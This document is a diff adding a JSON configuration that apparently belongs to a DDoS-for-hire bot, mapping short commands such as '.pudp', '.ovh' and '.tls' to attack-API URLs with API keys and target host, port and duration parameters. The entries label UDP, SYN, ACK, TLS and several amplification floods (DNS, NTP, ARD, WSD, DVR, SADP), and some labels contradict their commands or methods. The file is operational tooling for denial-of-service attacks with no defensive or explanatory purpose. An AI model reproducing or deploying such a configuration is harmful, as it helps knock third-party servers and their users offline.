@@ -1,0 +1,63 @@
+{
+    ".pudp": {
+        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=PUDP",
+        "description": "UDP PPS flood"
+    },
+    ".game": {
+        "api": "http://127.0.0.1/api/attack?key=brizy123&host=$host&port=$port&time=$time&method=GAME",
+        "description": "TCP SYN flood"
+    },
+    ".tfo": {
+        "api": "http://127.0.0.1/api/attack?key=brizy123&host=$host&port=$port&time=$time&method=TFO",
+        "description": "TCP ACK flood"
+    },
+    ".hold": {
+        "api": "http://127.0.0.1/api/attack?key=brizy123&host=$host&port=$port&time=$time&method=HOLDER",
+        "description": "TCP ACK flood"
+    },
+    ".dns": {
+        "api": "http://127.0.0.1/api/attack?key=brizy123&host=$host&port=$port&time=$time&method=PUDP",
+        "description": "TCP TFO flood"
+    },
+    ".mixamp": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=MIXAMP",
+        "description": "TCP Middlebox amplification flood"
+    },
+    ".socket": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=PUDP",
+        "description": "DNS amplification flood"
+    },
+    ".rapid": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=RAPID",
+        "description": "NTP amplification flood"
+    },
+     ".http": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=http",
+        "description": "NTP amplification flood"
+    },
+    ".ovh": {
+        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=OVH",
+        "description": "ARD amplification flood"
+    },
+    ".tcp": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=TCP",
+        "description": "WSD amplification flood"
+    },
+    ".udp": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=UDP",
+        "description": "DVR amplification flood"
+    },
+    ".browser": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=BROWSER",
+        "description": "SADP amplification flood"
+    },
+    ".tls": {
+        "api": "http://127.0.0.1/api/attack?key=eblan&host=$host&port=$port&time=$time&method=TLS",
+        "description": "TLS flood"
+    },
+    ".gudp": {
+        "api": "http://127.0.0.1/api/attack?key=spacevin123&host=$host&port=$port&time=$time&method=GUDP",
+        "description": "GUDP flood"
+    }
+}
+  
